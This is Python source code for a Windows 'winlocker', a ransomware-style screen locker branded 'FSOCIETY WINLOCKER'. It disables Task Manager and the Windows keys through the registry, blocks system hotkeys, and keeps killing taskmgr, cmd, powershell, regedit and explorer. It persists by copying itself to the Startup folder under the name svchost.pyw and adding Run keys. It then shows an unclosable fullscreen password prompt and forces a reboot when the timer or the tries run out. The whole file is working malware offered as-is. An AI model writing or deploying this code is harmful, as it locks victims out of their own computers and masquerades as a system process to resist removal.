import os, sys, time, threading, ctypes, winreg, shutil, subprocess, tkinter as tk, traceback

try: import keyboard
except: subprocess.check_call([sys.executable,"-m","pip","install","keyboard"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW); import keyboard

PASS = "1601"
TRIES = 5
HOURS = 1
TIMER = os.path.join(os.environ['PROGRAMDATA'], "Microsoft", "timer.dat")
tries = TRIES

def lock():
    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
            try:
                r = winreg.OpenKey(h, k, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(r, n, 0, winreg.REG_DWORD, 1)
                winreg.CloseKey(r)
            except: pass
    for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','delete','windows','left windows','right windows']:
        try: keyboard.block_key(k)
        except: pass
    for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win+d','win+r','win+e','win+l','win+m','win+x','win+tab']:
        try: keyboard.add_hotkey(c, lambda:0, suppress=True)
        except: pass

def unlock():
    try: keyboard.unhook_all()
    except: pass
    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        for k,n in [(r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer","NoWinKeys"),(r"Software\Microsoft\Windows\CurrentVersion\Policies\System","DisableTaskMgr")]:
            try:
                r = winreg.OpenKey(h, k, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(r, n, 0, winreg.REG_DWORD, 0)
                winreg.CloseKey(r)
            except: pass

def kill():
    while True:
        for p in ["taskmgr.exe","cmd.exe","powershell.exe","regedit.exe","explorer.exe"]:
            try: os.system(f"taskkill /f /im {p} >nul 2>&1")
            except: pass
        time.sleep(0.05)

def timer_save():
    end = time.time() + HOURS * 3600
    os.makedirs(os.path.dirname(TIMER), exist_ok=True)
    with open(TIMER, 'w') as f: f.write(str(end))
    return end

def timer_get():
    try:
        with open(TIMER) as f: return float(f.read())
    except: return timer_save()

def timer_check():
    while True:
        if timer_get() - time.time() <= 0: destroy()
        time.sleep(5)

def destroy():
    os.system("shutdown /r /t 0 /f")
    os._exit(0)

def startup():
    s = os.path.abspath(sys.argv[0])
    d = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'svchost.pyw')
    try: shutil.copy2(s, d)
    except: pass
    pw = sys.executable.replace("python.exe", "pythonw.exe")
    for h in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
        try:
            r = winreg.OpenKey(h, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(r, "svchost", 0, winreg.REG_SZ, f'"{pw}" "{s}"')
            winreg.CloseKey(r)
        except: pass

class Locker:
    def __init__(self):
        global tries
        self.r = tk.Tk(); self.r.withdraw()
        self.w = tk.Toplevel(self.r)
        self.w.attributes('-fullscreen', True); self.w.attributes('-topmost', True)
        self.w.configure(bg='black'); self.w.overrideredirect(True)
        self.w.protocol("WM_DELETE_WINDOW", lambda:None)
        self.w.bind("<Alt-F4>", lambda e:None)
        self.w.bind("<Escape>", lambda e:None)
        self.w.focus_force()
        
        self.end = timer_get()
        self.tl = tk.Label(self.w, text="", bg='black', fg='#ff4444', font=('Courier', 30, 'bold'))
        self.tl.place(relx=0.5, rely=0.08, anchor='center')
        self.tick()
        
        msg = f"FSOCIETY WINLOCKER\n\nTRY: {TRIES}\nTIMER: {HOURS} HOUR"
        tk.Label(self.w, text=msg, bg='black', fg='white', font=('Courier', 12, 'bold'), justify='center').place(relx=0.5, rely=0.4, anchor='center')
        
        cf = tk.Frame(self.w, bg='black')
        cf.place(relx=0.5, rely=0.65, anchor='center')
        tk.Label(cf, text="ENTER PASSWORD:", bg='black', fg='white', font=('Courier', 14, 'bold')).pack(pady=(0,5))
        self.e = tk.Entry(cf, show="*", font=('Courier', 14, 'bold'), bg='white', fg='black', relief='solid', bd=2)
        self.e.pack(pady=(0,5), ipadx=40, ipady=3)
        self.sl = tk.Label(cf, text=f"LEFT: {tries}", bg='black', fg='white', font=('Courier', 12, 'bold'))
        self.sl.pack()
        self.e.bind('<Return>', self.chk)
        self.e.focus_force()
        self.w.after(100, self.focus)
    
    def tick(self):
        r = self.end - time.time()
        if r <= 0: destroy()
        h, m, s = int(r//3600), int((r%3600)//60), int(r%60)
        self.tl.config(text=f"{h:02d}:{m:02d}:{s:02d}")
        self.w.after(1000, self.tick)
    
    def focus(self):
        try: self.w.focus_force(); self.e.focus_force(); self.w.after(100, self.focus)
        except: pass
    
    def chk(self, e=None):
        global tries
        if self.e.get() == PASS:
            unlock()
            self.sl.config(text="CORRECT!", fg='white')
            self.w.update()
            try: os.remove(TIMER)
            except: pass
            time.sleep(1)
            self.r.destroy()
            os._exit(0)
        else:
            tries -= 1
            if tries > 0:
                self.sl.config(text=f"WRONG! LEFT: {tries}", fg='white')
            else:
                self.sl.config(text="404 | ERROR", fg='white')
                self.w.update()
                time.sleep(2)
                destroy()
            self.e.delete(0, tk.END)

if __name__ == "__main__":
    print("WINLOCKER STARTING...")
    try:
        threading.Thread(target=kill, daemon=True).start()
        threading.Thread(target=timer_check, daemon=True).start()
        startup()
        lock()
        Locker()
        tk.mainloop()
    except Exception as e:
        with open(os.path.join(os.environ['TEMP'], 'wl_error.log'), 'w', encoding='utf-8') as f:
            traceback.print_exc(file=f)
        print(f"ERROR: {e}")
        input("Press Enter...")
